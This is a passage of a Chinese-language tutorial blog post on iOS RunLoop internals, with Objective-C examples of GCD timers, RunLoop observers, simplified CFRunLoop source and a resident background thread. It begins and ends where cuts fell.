在允许范围内增加误差可提高程序的性能</span></span><br><span class="line"><span class="comment">         GCD的单位是纳秒 所以要*NSEC_PER_SEC</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        dispatch_source_set_timer(timer, DISPATCH_TIME_NOW, <span class="number">2.0</span> * <span class="built_in">NSEC_PER_SEC</span>, <span class="number">0</span> * <span class="built_in">NSEC_PER_SEC</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3.设置定时器要执行的事情</span></span><br><span class="line">        dispatch_source_set_event_handler(timer, ^&#123;</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;---%@--&quot;</span>,[<span class="built_in">NSThread</span> currentThread]);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 启动</span></span><br><span class="line">        dispatch_resume(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><pre><code>### 2. CFRunLoopSourceRef事件源（输入源）#### Source分为两种##### Source0：非基于Port的 用于用户主动触发的事件（点击button 或点击屏幕）</code></pre><h5 id="Source1：基于Port的-通过内核和其他线程相互发送消息（与内核相关）"><a href="#Source1：基于Port的-通过内核和其他线程相互发送消息（与内核相关）" class="headerlink" title="Source1：基于Port的 通过内核和其他线程相互发送消息（与内核相关）"></a>Source1：基于Port的 通过内核和其他线程相互发送消息（与内核相关）</h5><h5 id=""><a href="#" class="headerlink" title="#"></a>#</h5><p>触摸事件及PerformSelectors会触发Source0事件源在前文已经验证过</p><h3 id="3-CFRunLoopObserverRef"><a href="#3-CFRunLoopObserverRef" class="headerlink" title="3. CFRunLoopObserverRef"></a>3. CFRunLoopObserverRef</h3><h4 id="CFRunLoopObserverRef是观察者，能够监听RunLoop的状态改变"><a href="#CFRunLoopObserverRef是观察者，能够监听RunLoop的状态改变" class="headerlink" title="CFRunLoopObserverRef是观察者，能够监听RunLoop的状态改变"></a>CFRunLoopObserverRef是观察者，能够监听RunLoop的状态改变</h4><p>给RunLoop添加监听者，监听其运行状态:</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">-(<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="comment">//创建监听者</span></span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">         第一个参数 CFAllocatorRef allocator：分配存储空间 CFAllocatorGetDefault()默认分配</span></span><br><span class="line"><span class="comment">         第二个参数 CFOptionFlags activities：要监听的状态 kCFRunLoopAllActivities 监听所有状态</span></span><br><span class="line"><span class="comment">         第三个参数 Boolean repeats：YES:持续监听 NO:不持续</span></span><br><span class="line"><span class="comment">         第四个参数 CFIndex order：优先级，一般填0即可</span></span><br><span class="line"><span class="comment">         第五个参数 ：回调 两个参数observer:监听者 activity:监听的事件</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">         所有事件</span></span><br><span class="line"><span class="comment">         typedef CF_OPTIONS(CFOptionFlags, CFRunLoopActivity) &#123;</span></span><br><span class="line"><span class="comment">         kCFRunLoopEntry = (1UL &lt;&lt; 0),   //   即将进入RunLoop</span></span><br><span class="line"><span class="comment">         kCFRunLoopBeforeTimers = (1UL &lt;&lt; 1), // 即将处理Timer</span></span><br><span class="line"><span class="comment">         kCFRunLoopBeforeSources = (1UL &lt;&lt; 2), // 即将处理Source</span></span><br><span class="line"><span class="comment">         kCFRunLoopBeforeWaiting = (1UL &lt;&lt; 5), //即将进入休眠</span></span><br><span class="line"><span class="comment">         kCFRunLoopAfterWaiting = (1UL &lt;&lt; 6),// 刚从休眠中唤醒</span></span><br><span class="line"><span class="comment">         kCFRunLoopExit = (1UL &lt;&lt; 7),// 即将退出RunLoop</span></span><br><span class="line"><span class="comment">         kCFRunLoopAllActivities = 0x0FFFFFFFU</span></span><br><span class="line"><span class="comment">         &#125;;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">CFRunLoopObserverRef</span> observer = <span class="built_in">CFRunLoopObserverCreateWithHandler</span>(<span class="built_in">CFAllocatorGetDefault</span>(), kCFRunLoopAllActivities, <span class="literal">YES</span>, <span class="number">0</span>, ^(<span class="built_in">CFRunLoopObserverRef</span> observer, <span class="built_in">CFRunLoopActivity</span> activity) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (activity) &#123;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopEntry:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop进入&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeTimers:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要处理Timers了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeSources:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要处理Sources了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeWaiting:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要休息了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopAfterWaiting:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop醒来了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopExit:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop退出了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 给RunLoop添加监听者</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         第一个参数 CFRunLoopRef rl：要监听哪个RunLoop,这里监听的是主线程的RunLoop</span></span><br><span class="line"><span class="comment">         第二个参数 CFRunLoopObserverRef observer 监听者</span></span><br><span class="line"><span class="comment">         第三个参数 CFStringRef mode 要监听RunLoop在哪种运行模式下的状态</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">CFRunLoopAddObserver</span>(<span class="built_in">CFRunLoopGetCurrent</span>(), observer, kCFRunLoopDefaultMode);</span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">         CF的内存管理（Core Foundation）</span></span><br><span class="line"><span class="comment">         凡是带有Create、Copy、Retain等字眼的函数，创建出来的对象，都需要在最后做一次release</span></span><br><span class="line"><span class="comment">         GCD本来在iOS6.0之前也是需要我们释放的，6.0之后GCD已经纳入到了ARC中，所以我们不需要管了</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="built_in">CFRelease</span>(observer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>监听者监听RunLoop运行状态</p><p>以上可以看出，Observer确实用来监听RunLoop的状态，包括唤醒，休息，以及处理各种事件。</p><h1 id="八-RunLoop处理逻辑"><a href="#八-RunLoop处理逻辑" class="headerlink" title="八. RunLoop处理逻辑"></a>八. RunLoop处理逻辑</h1><p>这时我们再来分析RunLoop的处理逻辑，就会简单明了很多，现在回头看官方文档RunLoop的处理逻辑，对RunLoop的处理逻辑有新的认识。<br>)</p><p><img src="https://s2.loli.net/2022/07/20/QSx1BM4ApDdaPw5.png" alt="官方文档RunLoop处理逻辑"></p><h3 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h3><h4 id="源码仅保留了主流程代码"><a href="#源码仅保留了主流程代码" class="headerlink" title="源码仅保留了主流程代码"></a>源码仅保留了主流程代码</h4><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 共外部调用的公开的CFRunLoopRun方法，其内部会调用CFRunLoopRunSpecific</span></span><br><span class="line">    <span class="type">void</span> <span class="built_in">CFRunLoopRun</span>(<span class="type">void</span>) &#123;   <span class="comment">/* DOES CALLOUT */</span></span><br><span class="line">        int32_t result;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            result = <span class="built_in">CFRunLoopRunSpecific</span>(<span class="built_in">CFRunLoopGetCurrent</span>(), kCFRunLoopDefaultMode, <span class="number">1.0e10</span>, <span class="literal">false</span>);</span><br><span class="line">            CHECK_FOR_FORK();</span><br><span class="line">        &#125; <span class="keyword">while</span> (kCFRunLoopRunStopped != result &amp;&amp; kCFRunLoopRunFinished != result);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 经过精简的 CFRunLoopRunSpecific 函数代码，其内部会调用__CFRunLoopRun函数</span></span><br><span class="line">    SInt32 <span class="built_in">CFRunLoopRunSpecific</span>(<span class="built_in">CFRunLoopRef</span> rl, <span class="built_in">CFStringRef</span> modeName, <span class="built_in">CFTimeInterval</span> seconds, Boolean returnAfterSourceHandled) &#123;     <span class="comment">/* DOES CALLOUT */</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 通知Observers : 进入Loop</span></span><br><span class="line">        <span class="comment">// __CFRunLoopDoObservers内部会调用 __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__</span></span><br><span class="line">    函数</span><br><span class="line">        <span class="keyword">if</span> (currentMode-&gt;_observerMask &amp; kCFRunLoopEntry ) __CFRunLoopDoObservers(rl, currentMode, kCFRunLoopEntry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 核心的Loop逻辑</span></span><br><span class="line">        result = __CFRunLoopRun(rl, currentMode, seconds, returnAfterSourceHandled, previousMode);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通知Observers : 退出Loop</span></span><br><span class="line">        <span class="keyword">if</span> (currentMode-&gt;_observerMask &amp; kCFRunLoopExit ) __CFRunLoopDoObservers(rl, currentMode, kCFRunLoopExit);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 精简后的 __CFRunLoopRun函数，保留了主要代码</span></span><br><span class="line">    <span class="keyword">static</span> int32_t __CFRunLoopRun(<span class="built_in">CFRunLoopRef</span> rl, <span class="built_in">CFRunLoopModeRef</span> rlm, <span class="built_in">CFTimeInterval</span> seconds, Boolean stopAfterHandle, <span class="built_in">CFRunLoopModeRef</span> previousMode) &#123;</span><br><span class="line">        int32_t retVal = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 通知Observers：即将处理Timers</span></span><br><span class="line">            __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeTimers); </span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 通知Observers：即将处理Sources</span></span><br><span class="line">            __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeSources);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 处理Blocks</span></span><br><span class="line">            __CFRunLoopDoBlocks(rl, rlm);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 处理Sources0</span></span><br><span class="line">            <span class="keyword">if</span> (__CFRunLoopDoSources0(rl, rlm, stopAfterHandle)) &#123;</span><br><span class="line">                <span class="comment">// 处理Blocks</span></span><br><span class="line">                __CFRunLoopDoBlocks(rl, rlm);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果有Sources1，就跳转到handle_msg标记处</span></span><br><span class="line">            <span class="keyword">if</span> (__CFRunLoopServiceMachPort(dispatchPort, &amp;msg, <span class="keyword">sizeof</span>(msg_buffer), &amp;livePort, <span class="number">0</span>, &amp;voucherState, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> handle_msg;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 通知Observers：即将休眠</span></span><br><span class="line">            __CFRunLoopDoObservers(rl, rlm, kCFRunLoopBeforeWaiting);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 进入休眠，等待其他消息唤醒</span></span><br><span class="line">            __CFRunLoopSetSleeping(rl);</span><br><span class="line">            __CFPortSetInsert(dispatchPort, waitSet);</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                __CFRunLoopServiceMachPort(waitSet, &amp;msg, <span class="keyword">sizeof</span>(msg_buffer), &amp;livePort, poll ? <span class="number">0</span> : TIMEOUT_INFINITY, &amp;voucherState, &amp;voucherCopy);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 醒来</span></span><br><span class="line">            __CFPortSetRemove(dispatchPort, waitSet);</span><br><span class="line">            __CFRunLoopUnsetSleeping(rl);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 通知Observers：已经唤醒</span></span><br><span class="line">            __CFRunLoopDoObservers(rl, rlm, kCFRunLoopAfterWaiting);</span><br><span class="line">            </span><br><span class="line">        handle_msg: <span class="comment">// 看看是谁唤醒了RunLoop，进行相应的处理</span></span><br><span class="line">            <span class="keyword">if</span> (被Timer唤醒的) &#123;</span><br><span class="line">                <span class="comment">// 处理Timer</span></span><br><span class="line">                __CFRunLoopDoTimers(rl, rlm, mach_absolute_time());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (被GCD唤醒的) &#123;</span><br><span class="line">                __CFRUNLOOP_IS_SERVICING_THE_MAIN_DISPATCH_QUEUE__(msg);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 被Sources1唤醒的</span></span><br><span class="line">                __CFRunLoopDoSource1(rl, rlm, rls, msg, msg-&gt;msgh_size, &amp;reply);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 执行Blocks</span></span><br><span class="line">            __CFRunLoopDoBlocks(rl, rlm);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据之前的执行结果，来决定怎么做，为retVal赋相应的值</span></span><br><span class="line">            <span class="keyword">if</span> (sourceHandledThisLoop &amp;&amp; stopAfterHandle) &#123;</span><br><span class="line">                retVal = kCFRunLoopRunHandledSource;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeout_context-&gt;termTSR &lt; mach_absolute_time()) &#123;</span><br><span class="line">                retVal = kCFRunLoopRunTimedOut;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__CFRunLoopIsStopped(rl)) &#123;</span><br><span class="line">                __CFRunLoopUnsetStopped(rl);</span><br><span class="line">                retVal = kCFRunLoopRunStopped;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rlm-&gt;_stopped) &#123;</span><br><span class="line">                rlm-&gt;_stopped = <span class="literal">false</span>;</span><br><span class="line">                retVal = kCFRunLoopRunStopped;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__CFRunLoopModeIsEmpty(rl, rlm, previousMode)) &#123;</span><br><span class="line">                retVal = kCFRunLoopRunFinished;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">0</span> == retVal);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上述源代码中，相应处理事件函数内部还会调用更底层的函数，内部调用才是真正处理事件的函数，通过上面bt打印全部堆栈信息也可以得到验证。<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__CFRunLoopDoObservers 内部调用 </span><br><span class="line"></span><br><span class="line">__CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__</span><br><span class="line"></span><br><span class="line">__CFRunLoopDoBlocks 内部调用 __CFRUNLOOP_IS_CALLING_OUT_TO_A_BLOCK__</span><br><span class="line"></span><br><span class="line">__CFRunLoopDoSources0 内部调用 </span><br><span class="line"></span><br><span class="line">__CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__</span><br><span class="line"></span><br><span class="line">__CFRunLoopDoTimers 内部调用 </span><br><span class="line"></span><br><span class="line">__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__</span><br><span class="line">GCD 调用</span><br><span class="line">__CFRUNLOOP_IS_SERVICING_THE_MAIN_DISPATCH_QUEUE__</span><br><span class="line"> </span><br><span class="line">__CFRunLoopDoSource1 内部调用 </span><br><span class="line"></span><br><span class="line">__CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION__</span><br></pre></td></tr></table></figure></p><h1 id="九-RunLoop退出"><a href="#九-RunLoop退出" class="headerlink" title="九. RunLoop退出"></a>九. RunLoop退出</h1><ol><li>主线程销毁RunLoop退出</li><li>Mode中有一些Timer 、Source、 Observer，这些保证Mode不为空时保证RunLoop没有空转并且是在运行的，当Mode中为空的时候，RunLoop会立刻退出</li><li>在启动RunLoop的时候可以设置什么时候停止<figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">NSRunLoop</span> currentRunLoop]runUntilDate:&lt;#(<span class="keyword">nonnull</span> <span class="built_in">NSDate</span> *)#&gt;</span><br><span class="line">    [<span class="built_in">NSRunLoop</span> currentRunLoop]runMode:&lt;#(<span class="keyword">nonnull</span> <span class="built_in">NSString</span> *)#&gt; beforeDate:&lt;#(<span class="keyword">nonnull</span> <span class="built_in">NSDate</span> *)#&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="十-RunLoop应用"><a href="#十-RunLoop应用" class="headerlink" title="十. RunLoop应用"></a>十. RunLoop应用</h1><h3 id="1-常驻线程"><a href="#1-常驻线程" class="headerlink" title="1. 常驻线程"></a>1. 常驻线程</h3><p>常驻线程的作用：我们知道，当子线程中的任务执行完毕之后就被销毁了，那么如果我们需要开启一个子线程，在程序运行过程中永远都存在，那么我们就会面临一个问题，如何让子线程永远活着，这时就要用到常驻线程：给子线程开启一个RunLoop 注意：子线程执行完操作之后就会立即释放，即使我们使用强引用引用子线程使子线程不被释放，也不能给子线程再次添加操作，或者再次开启。 子线程开启RunLoop的代码，先点击屏幕开启子线程并开启子线程RunLoop，然后点击button。</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;ViewController.h&quot;</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></span><br><span class="line">    <span class="keyword">@property</span>(<span class="keyword">nonatomic</span>,<span class="keyword">strong</span>)<span class="built_in">NSThread</span> *thread;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@end</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></span><br><span class="line">    </span><br><span class="line">    - (<span class="type">void</span>)viewDidLoad &#123;</span><br><span class="line">        [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    &#125;</span><br><span class="line">    -(<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="comment">// 创建子线程并开启</span></span><br><span class="line">        <span class="built_in">NSThread</span> *thread = [[<span class="built_in">NSThread</span> alloc]initWithTarget:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(show) object:<span class="literal">nil</span>];</span><br><span class="line">        <span class="keyword">self</span>.thread = thread;</span><br><span class="line">        [thread start];</span><br><span class="line">    &#125;</span><br><span class="line">    -(<span class="type">void</span>)show</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注意：打印方法一定要在RunLoop创建开始运行之前，如果在RunLoop跑起来之后打印，RunLoop先运行起来，已经在跑圈了就出不来了，进入死循环也就无法执行后面的操作了。</span></span><br><span class="line">        <span class="comment">// 但是此时点击Button还是有操作的，因为Button是在RunLoop跑起来之后加入到子线程的，当Button加入到子线程RunLoop就会跑起来</span></span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;%s&quot;</span>,__func__);</span><br><span class="line">        <span class="comment">// 1.创建子线程相关的RunLoop，在子线程中创建即可，并且RunLoop中要至少有一个Timer 或 一个Source 保证RunLoop不会因为空转而退出，因此在创建的时候直接加入</span></span><br><span class="line">        <span class="comment">// 添加Source [NSMachPort port] 添加一个端口</span></span><br><span class="line">        [[<span class="built_in">NSRunLoop</span> currentRunLoop] addPort:[<span class="built_in">NSMachPort</span> port] forMode:<span class="built_in">NSDefaultRunLoopMode</span>];</span><br><span class="line">        <span class="comment">// 添加一个Timer</span></span><br><span class="line">        <span class="built_in">NSTimer</span> *timer = [<span class="built_in">NSTimer</span> scheduledTimerWithTimeInterval:<span class="number">2.0</span> target:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(test) userInfo:<span class="literal">nil</span> repeats:<span class="literal">YES</span>];</span><br><span class="line">        [[<span class="built_in">NSRunLoop</span> currentRunLoop] addTimer:timer forMode:<span class="built_in">NSDefaultRunLoopMode</span>];    </span><br><span class="line">        <span class="comment">//创建监听者</span></span><br><span class="line">        <span class="built_in">CFRunLoopObserverRef</span> observer = <span class="built_in">CFRunLoopObserverCreateWithHandler</span>(<span class="built_in">CFAllocatorGetDefault</span>(), kCFRunLoopAllActivities, <span class="literal">YES</span>, <span class="number">0</span>, ^(<span class="built_in">CFRunLoopObserverRef</span> observer, <span class="built_in">CFRunLoopActivity</span> activity) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (activity) &#123;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopEntry:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop进入&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeTimers:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要处理Timers了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeSources:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要处理Sources了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopBeforeWaiting:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop要休息了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopAfterWaiting:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop醒来了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> kCFRunLoopExit:</span><br><span class="line">                    <span class="built_in">NSLog</span>(<span class="string">@&quot;RunLoop退出了&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 给RunLoop添加监听者</span></span><br><span class="line">        <span class="built_in">CFRunLoopAddObserver</span>(<span class="built_in">CFRunLoopGetCurrent</span>(), observer, kCFRunLoopDefaultMode);</span><br><span class="line">        <span class="comment">// 